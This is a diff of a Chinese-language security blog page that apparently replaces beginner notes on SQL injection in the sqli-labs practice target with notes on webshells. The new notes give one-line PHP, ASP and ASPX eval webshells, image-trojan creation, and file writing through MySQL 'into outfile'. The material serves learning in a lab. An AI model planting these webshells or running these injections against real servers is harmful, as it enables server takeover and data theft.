@@ -161,47 +161,38 @@
 
         <div id="main" >
             <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
-                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >新手小白第一次打sqli-lab靶场（less1）的小总结</h2></a>
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >文件传输以及一句话木马的小见解</h2></a>
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <p>  <strong>首先总结一些，在学习less 1时的一些sql注入的语言</strong></p>
-<p>  注释符(即之后的语句不再执行）： –+、– （空格）【/**/可代替空格】、#</p>
-<p>  查库：select schema_name from information_schema.schemata</p>
-<p>  查表：select table_name from information_schema.tables where table_name=’security’</p>
-<p>  查列：select column_name from information_schema.columns where table_name=’users’</p>
-<p>  order by _(数字)</p>
-<p>  union select(联合查询)</p>
-<p>  <strong>一些用到的函数</strong></p>
-<p>  group concat（将所有数据连接做成一行进行显示）</p>
-<p>  concat_ws（并列指令）【我感觉是并列指令】</p>
-<p>  永恒为真：and 1=1</p>
-<p><a href="https://sm.ms/image/kVyK1A56GOfTRCv" target="_blank"><img src="https://i.loli.net/2021/10/08/kVyK1A56GOfTRCv.png" style="zoom:50%;"  ></a></p>
-<p>  永恒为假：and 1=2</p>
-<p><a href="https://sm.ms/image/jZ7aEmdAHCND36S" target="_blank"><img src="https://i.loli.net/2021/10/08/jZ7aEmdAHCND36S.png" ></a></p>
-<p><strong>自己的一些做题过程</strong></p>
-<p>看到提示里的id字样，用到?(get)指令，得到一个id</p>
-<p><a href="https://sm.ms/image/uyGpZ1rg2hMCeXV" target="_blank"><img src="https://i.loli.net/2021/10/08/uyGpZ1rg2hMCeXV.png" ></a></p>
-<p>之后加入’，会发现出现了SQL syntax的报错，则存在SQL漏洞</p>
-<p><a href="https://sm.ms/image/eQLPclu7mkpz4Ng" target="_blank"><img src="https://i.loli.net/2021/10/08/eQLPclu7mkpz4Ng.png" ></a></p>
-<p>这时候用order by指令可以知道数据库共有三列</p>
-<p>并用查库指令知道数据库的资料</p>
-<p><a href="https://sm.ms/image/5fsKBE3dhAWnRzO" target="_blank"><img src="https://i.loli.net/2021/10/08/5fsKBE3dhAWnRzO.png" ></a></p>
-<p>再分别用查表指令</p>
-<p><a href="https://sm.ms/image/COTStXn7dKyW5Qs" target="_blank"><img src="https://i.loli.net/2021/10/08/COTStXn7dKyW5Qs.png" ></a></p>
-<p>这里涉及单引号问题（我现在也不清楚单引号问题是什么）可改16进制表示（0x……）</p>
-<p><a href="https://sm.ms/image/ZioVd7aKuhgTCEB" target="_blank"><img src="https://i.loli.net/2021/10/08/ZioVd7aKuhgTCEB.png" ></a></p>
-<p>查列</p>
-<p><a href="https://sm.ms/image/FUKJVSbd4IzQ1PL" target="_blank"><img src="https://i.loli.net/2021/10/08/FUKJVSbd4IzQ1PL.png" ></a></p>
-<p>改16进制</p>
-<p><a href="https://sm.ms/image/HV134FpxfEeAwrN" target="_blank"><img src="https://i.loli.net/2021/10/08/HV134FpxfEeAwrN.png" ></a></p>
-<p>查字段</p>
-<p><a href="https://sm.ms/image/ZxJq4zo1r6yHF79" target="_blank"><img src="https://i.loli.net/2021/10/09/ZxJq4zo1r6yHF79.png" ></a></p>
-<p>用concat_ws函数联合group_concat函数爆数据库</p>
-<p><a href="https://sm.ms/image/9IwizF48hADQMqL" target="_blank"><img src="https://i.loli.net/2021/10/09/9IwizF48hADQMqL.png" ></a></p>
-<p>学习时参考了：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1e441127Rd?p=4">https://www.bilibili.com/video/BV1e441127Rd?p=4</a></p>
-<p>​                           还有一些没记住地址的博客</p>
-<p>​                           还有炜刚学长的blog</p>
+                <p> <strong>一句话木马的总结：</strong></p>
+<p> php型：<?php @eval($_POST['ydx']);?></p>
+<p> asp型：&lt;%eval request(“ydx”)%&gt;</p>
+<p>aspx型：&lt;%@ page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“ydx”],”unsafe”);%&gt;</p>
+<p> 其中ydx为密码，即可在中国菜刀中输入使用</p>
+<p> <a href="https://sm.ms/image/sXaGIPkK9FfTbQJ" target="_blank"><img src="https://s2.loli.net/2022/01/26/sXaGIPkK9FfTbQJ.png" ></a> eval（）为函数，括号内即要执行的代码</p>
+<p> @表示不报错，即就算执行错误，也不报错</p>
+<p> 传输数据的两种方法：get、post</p>
+<p> 其中get是在信息头的url路径下中存放数据</p>
+<p> 而post是在消息体中存放数据</p>
+<p> <strong>图片木马的生成</strong></p>
+<p> <a href="https://sm.ms/image/287otRTsdCibGQa" target="_blank"><img src="https://s2.loli.net/2022/01/27/287otRTsdCibGQa.png" ></a></p>
+<p> 其中b表示二进制文件（+后即要覆盖进图片的木马）</p>
+<p> a表示ASCLL码文件（a后即生成的图片木马）</p>
+<p> <strong>Less 7</strong></p>
+<p> 先登入进mysql命令行，输入show variables like ‘secure%’查看是否开启文件读写权限</p>
+<p> <a href="https://sm.ms/image/kjva5tUOPKHoAuQ" target="_blank"><img src="https://s2.loli.net/2022/01/27/kjva5tUOPKHoAuQ.png" ></a></p>
+<p> 若为NULL即为没有权限，此时需到mysql文件夹中，找到对应的my.ini文件，在其中加入<a href="https://sm.ms/image/WivGrl437YkceOC" target="_blank"><img src="https://s2.loli.net/2022/01/27/WivGrl437YkceOC.png" ></a></p>
+<p> 之后重启mysql服务（这里并不是关闭运行指令框，而是关闭mysql服务再重启，再开指令框）</p>
+<p> 可看到NULL变成你输入的地址</p>
+<p> <a href="https://sm.ms/image/yLajvJ9Xh2ZE4fR" target="_blank"><img src="https://s2.loli.net/2022/01/27/yLajvJ9Xh2ZE4fR.png" ></a></p>
+<p> 此时可用上图所示方法使用select ’‘ into outfile ’‘；函数进行文件的上传</p>
+<p> select后’ ‘内表示要上传的文件内容，outfile后’ ‘内表示文件上传的地址，最后是所上传文件的名称和格式（此处用\是因为\容易报错，不推荐使用）</p>
+<p> 上传成功之后可以select load_file函数查看文件内容</p>
+<p> <a href="https://sm.ms/image/7BQacsHXRNkfAeo" target="_blank"><img src="https://s2.loli.net/2022/01/27/7BQacsHXRNkfAeo.png" ></a></p>
+<p> 其中(‘  ‘)内即文件地址和所要读取的文件名</p>
+<p> 在less 7中上传文件<a href="https://sm.ms/image/5AQTEOoHUj6L847" target="_blank"><img src="https://s2.loli.net/2022/01/27/5AQTEOoHUj6L847.png" ></a></p>
+<p> 虽然回显说有一个sql语法错误，但翻看Less 7的目录，会发现文件已传输成功。</p>
 
             </div>
 
@@ -264,8 +255,8 @@ $('.btn_click_load').click(function() {
 -->
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://example.com/2021/10/08/%E6%96%B0%E6%89%8B%E5%B0%8F%E7%99%BD%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93sqli-lab%E9%9D%B6%E5%9C%BA%EF%BC%88less1%EF%BC%89%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://example.com/2021/10/08/%E6%96%B0%E6%89%8B%E5%B0%8F%E7%99%BD%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93sqli-lab%E9%9D%B6%E5%9C%BA%EF%BC%88less1%EF%BC%89%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://example.com/2022/01/25/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E4%BB%A5%E5%8F%8A%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B0%8F%E8%A7%81%E8%A7%A3/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/01/25/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E4%BB%A5%E5%8F%8A%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B0%8F%E8%A7%81%E8%A7%A3/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
